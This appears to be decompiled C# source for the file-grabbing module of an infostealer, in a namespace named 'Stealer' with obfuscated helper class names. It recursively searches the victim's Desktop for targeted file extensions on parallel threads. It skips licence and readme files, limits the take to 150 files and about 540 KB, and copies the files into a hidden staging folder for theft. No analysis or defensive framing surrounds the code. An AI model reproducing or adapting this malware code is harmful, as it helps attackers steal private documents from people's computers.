using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace Stealer;

public class FileGrabber
{
	public static int count = 0;

	public static long maxsize = 0L;

	public static int repeats = 0;

	public static long max = 540032L;

	public static List<Thread> threads = new List<Thread>();

	public static List<string> no = new List<string> { "filelistabsolute", "license", "dotnet_library_license", "thirdpartynotices", "appid", "version", "top_level", "readme", "notices" };

	[STAThread]
	public static void get()
	{
		try
		{
			Directory.CreateDirectory(UkxqzSnSlVuHNc.GrabberDir);
			foreach (string ext in LhEWYGmwhOEoYt.Extensions)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (maxsize <= max && count <= 149)
					{
						string[] files = Directory.GetFiles(UkxqzSnSlVuHNc.DesktopPath, "*" + ext, SearchOption.AllDirectories);
						foreach (string text in files)
						{
							try
							{
								Path.GetFileName(text);
								if (maxsize > max || count > 149)
								{
									break;
								}
								Grab(text);
							}
							catch (Exception value2)
							{
								Console.WriteLine(value2);
							}
						}
					}
				});
				thread.Start();
				threads.Add(thread);
			}
			foreach (Thread thread2 in threads)
			{
				thread2.Join();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}

	public static void Grab(string s)
	{
		try
		{
			if (maxsize > max || count > 149)
			{
				return;
			}
			string fileName = Path.GetFileName(s);
			foreach (string item in no)
			{
				if (fileName.ToLower().Contains(item.ToLower()))
				{
					return;
				}
			}
			long length = new FileInfo(s).Length;
			if (length > 502400L || length == 0L)
			{
				return;
			}
			maxsize += length;
			if (maxsize > max)
			{
				maxsize -= length;
				return;
			}
			string fileName2 = Path.GetFileName(s);
			if (!(fileName2 == ""))
			{
				string text = UkxqzSnSlVuHNc.GrabberDir + "\\" + fileName2;
				if (File.Exists(text))
				{
					text = UkxqzSnSlVuHNc.GrabberDir + $"\\{repeats}" + fileName2;
					repeats++;
				}
				if (maxsize <= max && count <= 149)
				{
					File.Copy(s, text);
					count++;
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
